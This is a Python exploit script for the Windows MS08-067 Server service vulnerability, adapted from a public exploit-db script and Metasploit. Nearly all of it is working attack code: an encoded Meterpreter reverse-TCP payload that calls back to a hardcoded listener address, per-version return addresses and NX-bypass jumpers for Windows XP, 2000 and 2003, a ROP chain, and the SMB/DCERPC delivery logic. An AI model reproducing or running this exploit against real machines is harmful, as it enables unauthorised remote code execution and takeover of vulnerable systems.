import struct
import time
import sys
import subprocess
import re

from threading import Thread    #Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket import dcerpc
    from impacket.dcerpc.v5 import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#'
print '#   Extended and modified by Erwin Wildenburg'
print '#######################################################################\n'

nopsled = "\x90" * 30

# windows/meterpreter/reverse_tcp - 380 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/call4_dword_xor
# VERBOSE=false, LHOST=192.168.11.116, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependMigrate=false, 
# EXITFUNC=thread, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300
# BadCharacters=\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40
buf =  ""
buf += "\x33\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x24\x03\x01\x05\x83\xee\xfc\xe2\xf4\x17\xca"
buf += "\x82\xec\x89\xeb\xfe\xfa\xdb\xfc\xc1\x5b\xa5\x75\x0f"
buf += "\xf5\x3b\x3c\x7e\x86\xca\xff\xe3\xf1\xff\xd5\xbd\x93"
buf += "\x67\xf4\xc1\x85\x2b\xe3\xfe\x24\x55\x6a\x30\x4f\x58"
buf += "\x62\x6e\xf9\x3a\xe0\xdc\x8e\xca\x59\xc3\xc3\x58\x78"
buf += "\xbf\xd5\x1e\x6f\x80\x74\x60\xe6\x4e\xec\xc7\x0b\xa0"
buf += "\xa9\x0f\x6c\xa2\xde\xdb\x5e\x59\xca\x27\xb6\xbb\x43"
buf += "\xc2\x87\x1b\xae\xac\xe6\xeb\x41\x75\xba\x50\x98\x33"
buf += "\x3d\xa9\xe2\x28\x01\x91\xec\x16\x49\x77\xf6\x46\xca"
buf += "\xd9\xe6\x07\x77\x14\xc7\x26\x71\x39\x38\x75\xe1\x50"
buf += "\x98\x37\x3d\x91\xf6\xac\xfa\xca\xb2\xc4\xfe\xda\x1b"
buf += "\x76\x3d\x82\xea\x26\x65\x50\x83\x3f\x55\xe1\x83\xac"
buf += "\x82\x50\xcb\xf1\x87\x24\x66\xe6\x79\xd6\xcb\xe0\x8e"
buf += "\x3b\xbf\xd1\xb5\xa6\x32\x1c\xcb\xff\xbf\xc3\xee\x50"
buf += "\x92\x03\xb7\x08\xac\xac\xba\x90\x41\x7f\xaa\xda\x19"
buf += "\xac\xb2\x50\xcb\xf7\x3f\x9f\xee\x03\xed\x80\xab\x7e"
buf += "\xec\x8a\x35\xc7\xe9\x84\x90\xac\xa4\x30\x47\x7a\xde"
buf += "\xe8\xf8\x27\xb6\xb3\xbd\x54\x84\x84\x9e\x4f\xfa\xac"
buf += "\xec\x20\x49\x0e\x72\xb7\xb7\xdb\xca\x0e\x72\x8f\x9a"
buf += "\x4f\x9f\x5b\xa1\x27\x49\x0e\xa0\x22\xde\x1b\x62\x2c"
buf += "\xc2\xb3\xc8\x27\xa7\x87\x43\xc1\xe6\x8b\x9a\x77\xf6"
buf += "\x8b\x8a\x77\xde\x31\xc5\xf8\x56\x24\x1f\xb0\xdc\xcb"
buf += "\x9c\x70\xde\x42\x6f\x53\xd7\x24\x1f\xa2\x76\xaf\xc6"
buf += "\xd8\xf8\xd3\xbf\xcb\xde\x2b\x7f\x85\xe0\x24\x1f\x4d"
buf += "\xb6\xb1\xce\x71\xe1\xb3\xc8\xfe\x7e\x84\x35\xf2\x3d"
buf += "\xed\xa0\x67\xde\xdb\xda\x27\xb6\x8d\xa0\x27\xde\x83"
buf += "\x6e\x74\x53\x24\x1f\xb4\xe5\xb1\xca\x71\xe5\x8c\xa2"
buf += "\x25\x6f\x13\x95\xd8\x63\xda\x09\x0e\x70\xae\x24\xe4"
buf += "\xb6\xdb\xca"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port   = port
        self.target   = target
	self.os	      = os

    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)

	print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + nopsled + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'

if __name__ == '__main__':
	try:
		target = sys.argv[1]
		os = sys.argv[2]
	except IndexError:
		print 'Usage: %s <ip> <target>' % sys.argv[0]
		print 'Example: %s 192.168.1.100 6\n' % sys.argv[0]

		print 'Targets:'
		print '[1] Windows XP SP0/SP1 Universal'
		print '[2] Windows 2000 Universal'
		print '[3] Windows 2003 SP0 Universal'
		print '[4] Windows 2003 SP1 English'
		print '[5] Windows XP SP3 French (NX)'
		print '[6] Windows XP SP3 English (NX)'
		print '[7] Windows XP SP3 English (AlwaysOn NX)'

		sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()
